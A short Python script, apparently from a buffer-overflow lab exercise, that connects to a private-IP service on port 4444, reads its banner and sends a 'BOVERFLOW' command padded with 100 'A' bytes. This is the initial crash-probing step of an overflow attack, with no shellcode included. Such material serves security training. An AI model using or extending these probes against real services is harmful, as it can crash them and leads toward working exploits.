#!/usr/bin/env

import socket

host, port = "10.10.10.123", 4444

command = b"BOVERFLOW "

payload = b"".join(
    [
        command,
        b"A" * 100,
    ]
)

with socket.socket() as s:
    s.connect((host, port))
    banner = s.recv(4096).decode("utf-8").strip()
    s.send(payload)
